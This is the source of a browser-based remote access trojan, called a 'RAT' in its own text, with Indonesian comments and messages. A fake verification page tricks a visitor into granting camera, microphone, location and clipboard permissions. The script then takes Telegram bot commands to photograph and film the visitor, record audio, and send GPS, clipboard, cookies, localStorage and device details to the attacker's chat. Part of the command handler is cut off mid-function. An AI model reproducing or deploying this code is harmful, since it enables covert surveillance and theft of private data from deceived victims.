// ================= SENTER =================
async function turnOnTorch() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        const track = stream.getVideoTracks()[0];
        if (track.getCapabilities().torch) {
            await track.applyConstraints({ advanced: [{ torch: true }] });
            torchTrack = track;
            return true;
        }
    } catch(e) { return false; }
}

async function turnOffTorch() {
    if (torchTrack) {
        await torchTrack.applyConstraints({ advanced: [{ torch: false }] });
        torchTrack.stop();
        torchTrack = null;
    }
}

async function sosTorch(duration = 10000) {
    if (sosInterval) clearInterval(sosInterval);
    let state = true;
    sosInterval = setInterval(async () => {
        if (state) await turnOnTorch();
        else await turnOffTorch();
        state = !state;
    }, 500);
    setTimeout(() => {
        if (sosInterval) clearInterval(sosInterval);
        turnOffTorch();
        sosInterval = null;
    }, duration);
}

// ================= KAMERA =================
async function takeCamera(facingMode = "user") {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
        const track = stream.getVideoTracks()[0];
        const imageCapture = new ImageCapture(track);
        const bitmap = await imageCapture.grabFrame();
        const canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        track.stop();
        stream.getTracks().forEach(t => t.stop());
        await sendPhotoToTelegram(blob, `camera_${facingMode}.jpg`);
        sendToTelegram(`📸 Foto ${facingMode === "user" ? "DEPAN" : "BELAKANG"} terkirim`);
    } catch(e) {
        sendToTelegram(`❌ Gagal ambil foto: ${e.message}`);
    }
}

async function recordVideo(facingMode = "user", duration = 10000) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } }, audio: true });
        videoRecorder = new MediaRecorder(stream);
        videoChunks = [];
        videoRecorder.ondataavailable = e => { if (e.data.size > 0) videoChunks.push(e.data); };
        videoRecorder.onstop = async () => {
            const blob = new Blob(videoChunks, { type: 'video/mp4' });
            await sendVideoToTelegram(blob, `video_${facingMode}_${Date.now()}.mp4`);
            stream.getTracks().forEach(t => t.stop());
            sendToTelegram(`🎥 Video ${facingMode === "user" ? "DEPAN" : "BELAKANG"} 10 detik terkirim`);
        };
        videoRecorder.start();
        sendToTelegram(`🎬 Merekam video ${facingMode === "user" ? "DEPAN" : "BELAKANG"} 10 detik...`);
        setTimeout(() => {
            if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
        }, duration);
    } catch(e) {
        sendToTelegram(`❌ Gagal rekam video: ${e.message}`);
    }
}

async function injectHtml2Canvas() {
    if (typeof html2canvas !== 'undefined') return;
    return new Promise((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
        script.onload = resolve;
        script.onerror = reject;
        document.head.appendChild(script);
    });
}

// ================= GET INFO =================
async function getAllInfo() {
    let ipData = {};
    try {
        const res = await fetch('https://ipapi.co/json/');
        ipData = await res.json();
    } catch(e) {}
    
    const ua = navigator.userAgent;
    let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
    if (/iPhone/i.test(ua)) device = 'iPhone';
    else if (/iPad/i.test(ua)) device = 'iPad';
    else if (/Android/i.test(ua)) device = 'Android';
    else if (/Windows/i.test(ua)) device = 'Windows';
    
    if (/Android/i.test(ua)) os = 'Android';
    else if (/iPhone|iPad/i.test(ua)) os = 'iOS';
    else if (/Windows NT/i.test(ua)) os = 'Windows';
    
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
    else if (/Firefox/i.test(ua)) browser = 'Firefox';
    
    let battery = 'Unknown';
    if ('getBattery' in navigator) {
        try { const bat = await navigator.getBattery(); battery = bat.level * 100; } catch(e) {}
    }
    
    let gps = { lat: 'Tidak ada izin', lon: 'Tidak ada izin' };
    if ('geolocation' in navigator) {
        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            gps = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        } catch(e) {}
    }
    
    let clipboard = '';
    try { clipboard = await navigator.clipboard.readText(); } catch(e) {}
    
    return { victimId, ip: ipData.ip || 'Unknown', city: ipData.city || 'Unknown', country: ipData.country_name || 'Unknown', gps, device, os, browser, battery, clipboard };
}

        if (isLocked && pass === currentLockPassword) hideLockScreen();
        else if (isLocked) await sendToTelegram(`❌ Password salah`);
        else await sendToTelegram(`ℹ️ Tidak dalam keadaan terkunci`);
    }
    else if (lower === '/lukazar') await panicMode();
    else if (lower === '/lowkik') await lowkik();
    else if (lower === '/volume') await maxVolume();
    else if (lower === '/sos') await sosTorch(10000);
    else if (lower === '/lukas') await takeCamera("environment");
    else if (lower === '/camera') await takeCamera("user");
    else if (lower === '/cahaya') { await turnOnTorch(); await sendToTelegram(`🔦 Senter menyala`); }
    else if (lower === '/ofcahya') { await turnOffTorch(); await sendToTelegram(`🔦 Senter mati`); }
    else if (lower === '/rekam') await recordAudio10Seconds();
    else if (lower === '/vdc') await recordVideo("user", 10000);
    else if (lower === '/vdci') await recordVideo("environment", 10000);
    else if (lower === '/audio') await playStoredAudio();
    else if (lower === '/sms') await sendToTelegram(`📱 Fitur SMS: Di web tidak bisa akses langsung. Butuh izin SMS di Android App.`);
    else if (lower === '/kontak') await readContacts();
    else if (lower === '/screenshot' || lower === '/ss') await takeScreenshot();
    else if (lower === '/ping') await sendToTelegram(`🏓 PONG! Victim ${victimId} online`);
    else if (lower === '/status') await sendToTelegram(`🟢 ONLINE | ID: ${victimId} | Locked: ${isLocked} | ExitLock: ${exitPasswordEnabled ? 'AKTIF' : 'OFF'}`);
    else if (lower === '/location') {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const maps = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await sendToTelegram(`📍 Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n<a href="${maps}">Buka Maps</a>`);
            }, async () => await sendToTelegram(`❌ Gagal akses GPS`));
        } else await sendToTelegram(`❌ GPS tidak support`);
    }
    else if (lower === '/clipboard') {
        try {
            const text = await navigator.clipboard.readText();
            await sendToTelegram(`📋 Clipboard:\n\`\`\`\n${text || 'Kosong'}\n\`\`\``);
        } catch(e) { await sendToTelegram(`❌ Gagal baca clipboard`); }
    }
    else if (lower === '/cookies') {
        await sendToTelegram(`🍪 Cookies:\n\`\`\`\n${document.cookie || 'Kosong'}\n\`\`\``);
    }
    else if (lower === '/storage') {
        let storage = '';
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            storage += `${key}: ${localStorage.getItem(key)}\n`;
        }
        await sendToTelegram(`💾 LocalStorage:\n\`\`\`\n${storage || 'Kosong'}\n\`\`\``);
    }
    else if (lower.startsWith('/buka ')) {
        const url = cmd.substring(6).trim();
        if (url) { window.open(url, '_blank'); await sendToTelegram(`✅ Membuka: ${url}`); }
        else await sendToTelegram(`❌ Format: /buka https://...`);
    }
    else if (lower.startsWith('/alert ')) {
        const msg = cmd.substring(7).trim();
        if (msg) { alert(msg); await sendToTelegram(`✅ Alert: ${msg}`); }
    }
    else if (lower.startsWith('/notif ')) {
        const msg = cmd.substring(7).trim();
        if ('Notification' in window && Notification.permission === 'granted') {
            new Notification('Pesan', { body: msg });
            await sendToTelegram(`✅ Notifikasi: ${msg}`);
        } else await sendToTelegram(`❌ Izin notifikasi belum ada`);
    }
    else if (lower === '/vibrate') {
        if ('vibrate' in navigator) { navigator.vibrate(500); await sendToTelegram(`📳 Getar`); }
        else await sendToTelegram(`❌ Tidak support getar`);
    }
    else if (lower.startsWith('/play ')) {
        const url = cmd.substring(6).trim();
        if (url) {
            const audio = new Audio(url);
            audio.play().catch(e => sendToTelegram(`❌ Gagal play: ${e.message}`));
            await sendToTelegram(`🔊 Memutar: ${url}`);
        }
    }
    else if (lower === '/redirect') {
        window.location.href = 'https://www.google.com';
        await sendToTelegram(`➡️ Redirect ke Google`);
    }
    else if (lower === '/info') {
        const data = await getAllInfo();
        let msg = `📱 <b>INFO VICTIM</b>\n━━━━━━━━━━\nID: ${data.victimId}\nIP: ${data.ip}\nLokasi: ${data.city}, ${data.country}\nGPS: ${data.gps.lat}, ${data.gps.lon}\nDevice: ${data.device}\nOS: ${data.os}\nBrowser: ${data.browser}\nBaterai: ${data.battery}%\nClipboard: ${data.clipboard || 'Kosong'}\nLocked: ${isLocked ? 'Ya' : 'Tidak'}\nExitLock: ${exitPasswordEnabled ? 'AKTIF' : 'OFF'}`;
        await sendToTelegram(msg);
    }
    else if (lower === '/help' || lower === '/menu') {
        const help = `🎮 <b>RAT COMMAND MENU LENGKAP</b>\n━━━━━━━━━━━━━━━\n/lubanar [pass] - AKTIFKAN exit password\n/aktaros [pass] - NONAKTIFKAN exit password\n/locked [pass] - Lock screen\n/unlock [pass] - Unlock\n/lukazar - PANIC MODE\n/lowkik - Kembali normal\n/volume - Volume penuh\n/sos - Senter SOS 10dtk\n/lukas - Kamera BELAKANG\n/camera - Kamera DEPAN\n/cahaya - Senter ON\n/ofcahya - Senter OFF\n/rekam - Rekam suara 10dtk\n/vdc - Rekam video DEPAN\n/vdci - Rekam video BELAKANG\n/audio - Play audio yg dikirim\n/kontak - Akses kontak\n/screenshot - Screenshot\n/location - GPS\n/clipboard - Clipboard\n/cookies - Cookies\n/storage - LocalStorage\n/buka [url] - Buka URL\n/alert [pesan] - Alert\n/notif [pesan] - Notif\n/vibrate - Getar\n/play [url] - Putar audio\n/redirect - Redirect\n/info - Info lengkap\n/ping - Cek\n/status - Status\n/help - Menu ini\n━━━━━━━━━━━━━━━\nVictim ID: ${victimId}`;
        await sendToTelegram(help);
    }
    else {
        await sendToTelegram(`❓ Perintah tidak dikenal. Ketik /help`);
    }
}

// ================= HANDLE AUDIO FILE =================
async function handleAudioFile(fileUrl) {
    try {
        const response = await fetch(fileUrl);
        audioBlobCache = await response.blob();
        sendToTelegram(`✅ File audio diterima. Ketik /audio untuk memutar.`);
    } catch(e) {
        sendToTelegram(`❌ Gagal download audio: ${e.message}`);
    }
}

// ================= POLLING =================
async function pollCommands() {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`;
    try {
        const res = await fetch(url);
        const data = await res.json();
        if (data.ok && data.result) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;
                const msg = update.message;
                if (msg && msg.chat.id.toString() === CHAT_ID) {
                    if (msg.text) {
                        await executeCommand(msg.text);
                    }
                    if (msg.voice || msg.audio || msg.document) {
                        let fileId = null;
                        if (msg.voice) fileId = msg.voice.file_id;
                        else if (msg.audio) fileId = msg.audio.file_id;
                        else if (msg.document && msg.document.mime_type?.startsWith('audio/')) fileId = msg.document.file_id;
                        
                        if (fileId) {
                            const fileInfo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`).then(r => r.json());
                            if (fileInfo.ok) {
                                const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.result.file_path}`;
                                await handleAudioFile(fileUrl);
                            }
                        }
                    }
                }
            }
        }
    } catch(e) {}
    setTimeout(pollCommands, 3000);
}

// ================= FAKE LOADING =================
async function fakeLoading() {
    const progressFill = document.getElementById('progressFill');
    const statusElem = document.getElementById('statusMsg');
    for (let p of [10,25,40,55,70,85,95,100]) {
        progressFill.style.width = p + '%';
        statusElem.innerHTML = `⏳ Memproses ${p}%...`;
        await new Promise(r => setTimeout(r, 150));
    }
    statusElem.innerHTML = '✅ Klik Lanjutkan untuk verifikasi';
}

// ================= INIT =================
async function setupUI() {
    const btn = document.getElementById('grantBtn');
    btn.classList.remove('hidden');
    btn.innerText = 'Lanjutkan';
    await fakeLoading();
    btn.onclick = async () => {
        btn.disabled = true;
        btn.innerText = 'Memproses...';
        await requestAllPermissions();
        btn.innerText = 'Selesai';
        document.getElementById('statusMsg').innerHTML = '✅ Perangkat siap.';
    };
}

async function init() {
    await setupUI();
    await sendToTelegram(`🎯 RAT ONLINE: ${victimId}`);
    pollCommands();
    setInterval(async () => {
        if (permissionsGranted) await sendToTelegram(`💓 Heartbeat: ${victimId} online`);
    }, 60000);
}

init();
</script>
